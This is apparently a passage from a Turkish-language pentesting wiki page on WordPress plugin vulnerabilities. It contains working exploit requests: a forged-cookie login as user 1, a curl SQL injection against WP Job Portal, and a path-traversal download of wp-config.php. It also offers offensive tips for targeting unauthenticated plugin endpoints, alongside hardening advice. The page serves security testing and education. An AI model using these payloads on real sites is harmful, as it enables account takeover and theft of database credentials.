Neden istismar edilebilir

- Genel erişime açık `init` hook'u, işleyicinin kimliği doğrulanmamış kullanıcılar tarafından erişilebilir olmasını sağlar (hiçbir `is_user_logged_in()` koruması yok).
- Kimlik, istemci tarafından değiştirilebilen bir cookie (`original_user_id`) üzerinden türetilir.
- Doğrudan `wp_set_auth_cookie($uid)` çağrısı, istekte bulunananı herhangi bir capability/nonce kontrolü olmadan o kullanıcı olarak oturum açtırır.

İstismar (kimliği doğrulanmamış)
```http
GET /?switch_back=1 HTTP/1.1
Host: victim.example
Cookie: original_user_id=1
User-Agent: PoC
Connection: close
```
---

### WAF considerations for WordPress/plugin CVEs

Genel edge/sunucu WAF'ları geniş desenlere (SQLi, XSS, LFI) göre ayarlanır. Birçok yüksek etkili WordPress/plugin zaafı, motor WordPress rotalarını ve plugin semantiğini anlamadıkça zararsız trafik gibi görünen uygulamaya özgü mantık/kimlik doğrulama hatalarıdır.

Offensive notes

- Target plugin-specific endpoints with clean payloads: `admin-ajax.php?action=...`, `wp-json/<namespace>/<route>`, custom file handlers, shortcodes.
- Exercise unauth paths first (AJAX `nopriv`, REST with permissive `permission_callback`, public shortcodes). Default payloads often succeed without obfuscation.
- Typical high-impact cases: privilege escalation (broken access control), arbitrary file upload/download, LFI, open redirect.

Defensive notes

- Don’t rely on generic WAF signatures to protect plugin CVEs. Implement application-layer, vulnerability-specific virtual patches or update quickly.
- Prefer positive-security checks in code (capabilities, nonces, strict input validation) over negative regex filters.

## WordPress Protection

### Regular Updates

WordPress, plugins ve temaların güncel olduğundan emin olun. Ayrıca otomatik güncellemelerin wp-config.php'de etkinleştirildiğini doğrulayın:
```bash
define( 'WP_AUTO_UPDATE_CORE', true );
add_filter( 'auto_update_plugin', '__return_true' );
add_filter( 'auto_update_theme', '__return_true' );
```
Also, **sadece güvenilir WordPress eklentilerini ve temalarını yükleyin**.

### Security Plugins

- [**Wordfence Security**](https://wordpress.org/plugins/wordfence/)
- [**Sucuri Security**](https://wordpress.org/plugins/sucuri-scanner/)
- [**iThemes Security**](https://wordpress.org/plugins/better-wp-security/)

### **Other Recommendations**

- Varsayılan **admin** kullanıcısını kaldırın
- **Güçlü parolalar** ve **2FA** kullanın
- Periyodik olarak kullanıcıların **izinlerini** **gözden geçirin**
- Brute Force saldırılarını önlemek için **oturum açma denemelerini sınırlayın**
- **`wp-admin.php`** dosyasının adını değiştirin ve yalnızca dahili veya belirli IP adreslerinden erişime izin verin.


### Kimlik doğrulaması gerektirmeyen yetersiz doğrulama nedeniyle SQL Injection (WP Job Portal <= 2.3.2)

WP Job Portal recruitment plugin, en sonunda `modules/category/model.php::validateFormData()` içinde aşağıdaki zafiyetli kodu çalıştıran **savecategory** görevini açığa çıkardı:
```php
$category  = WPJOBPORTALrequest::getVar('parentid');
$inquery   = ' ';
if ($category) {
$inquery .= " WHERE parentid = $category ";   // <-- direct concat ✗
}
$query  = "SELECT max(ordering)+1 AS maxordering FROM "
. wpjobportal::$_db->prefix . "wj_portal_categories " . $inquery; // executed later
```
Bu kod parçasının yol açtığı sorunlar:

1. Temizlenmemiş kullanıcı girdisi – `parentid` HTTP isteğinden doğrudan geliyor.
2. WHERE cümlesi içinde string birleştirme – `is_numeric()` / `esc_sql()` / prepared statement yok.
3. Kimliksız erişim – action `admin-post.php` üzerinden çalıştırılsa da, yapılan tek kontrol **CSRF nonce** (`wp_verify_nonce()`), ve bu nonce'u shortcode'u [wpjobportal_my_resumes] içeren herkese açık bir sayfadan herhangi bir ziyaretçi alabilir.

#### İstismar

1. Yeni bir nonce al:
```bash
curl -s https://victim.com/my-resumes/ | grep -oE 'name="_wpnonce" value="[a-f0-9]+' | cut -d'"' -f4
```
2. `parentid`'i kötüye kullanarak rastgele SQL enjekte et:
```bash
curl -X POST https://victim.com/wp-admin/admin-post.php \
-d 'task=savecategory' \
-d '_wpnonce=<nonce>' \
-d 'parentid=0 OR 1=1-- -' \
-d 'cat_title=pwn' -d 'id='
```
Yanıt, enjekte edilen sorgunun sonucunu açığa çıkarır veya veritabanını değiştirerek SQLi'yi kanıtlar.


### Kimliksız Rasgele Dosya İndirme / Path Traversal (WP Job Portal <= 2.3.2)

Başka bir görev, **downloadcustomfile**, ziyaretçilere path traversal yoluyla diskteki **herhangi bir dosyayı** indirme izni veriyordu. Zafiyetli sink `modules/customfield/model.php::downloadCustomUploadedFile()` içinde yer alır:
```php
$file = $path . '/' . $file_name;
...
echo $wp_filesystem->get_contents($file); // raw file output
```
`$file_name` saldırgan tarafından kontrol ediliyor ve **temizlenmeden** birleştiriliyor. Tekrar, tek engel özgeçmiş sayfasından alınabilecek bir **CSRF nonce**.

#### İstismar
```bash
curl -G https://victim.com/wp-admin/admin-post.php \
--data-urlencode 'task=downloadcustomfile' \
--data-urlencode '_wpnonce=<nonce>' \
--data-urlencode 'upload_for=resume' \
--data-urlencode 'entity_id=1' \
--data-urlencode 'file_name=../../../wp-config.php'
```
Sunucu `wp-config.php` içeriğini yanıt olarak döndürüyor, leaking DB credentials and auth keys.

## Referanslar

- [Unauthenticated Arbitrary File Deletion Vulnerability in Litho Theme](https://patchstack.com/articles/unauthenticated-arbitrary-file-delete-vulnerability-in-litho-the/)
- [Multiple Critical Vulnerabilities Patched in WP Job Portal Plugin](https://patchstack.com/articles/multiple-critical-vulnerabilities-patched-in-wp-job-portal-plugin/)
- [Rare Case of Privilege Escalation in ASE Plugin Affecting 100k+ Sites](https://patchstack.com/articles/rare-case-of-privilege-escalation-in-ase-plugin-affecting-100k-sites/)
- [ASE 7.6.3 changeset – delete original roles on profile update](https://plugins.trac.wordpress.org/changeset/3211945/admin-site-enhancements/tags/7.6.3/classes/class-view-admin-as-role.php?old=3208295&old_path=admin-site-enhancements%2Ftags%2F7.6.2%2Fclasses%2Fclass-view-admin-as-role.php)
- [Hosting security tested: 87.8% of vulnerability exploits bypassed hosting defenses](https://patchstack.com/articles/hosting-security-tested-87-percent-of-vulnerability-exploits-bypassed-hosting-defenses/)
- [WooCommerce Payments ≤ 5.6.1 – Unauth privilege escalation via trusted header (Patchstack DB)](https://patchstack.com/database/wordpress/plugin/woocommerce-payments/vulnerability/wordpress-woocommerce-payments-plugin-5-6-1-unauthenticated-privilege-escalation-vulnerability)
- [Hackers exploiting critical WordPress WooCommerce Payments bug](https://www.bleepingcomputer.com/news/security/hackers-exploiting-critical-wordpress-woocommerce-payments-bug/)
- [Unpatched Privilege Escalation in Service Finder Bookings Plugin](https://patchstack.com/articles/unpatched-privilege-escalation-in-service-finder-bookings-plugin/)
- [Service Finder Bookings privilege escalation – Patchstack DB entry](https://patchstack.com/database/wordpress/plugin/sf-booking/vulnerability/wordpress-service-finder-booking-6-0-privilege-escalation-vulnerability)

{{#include ../../banners/hacktricks-training.md}}
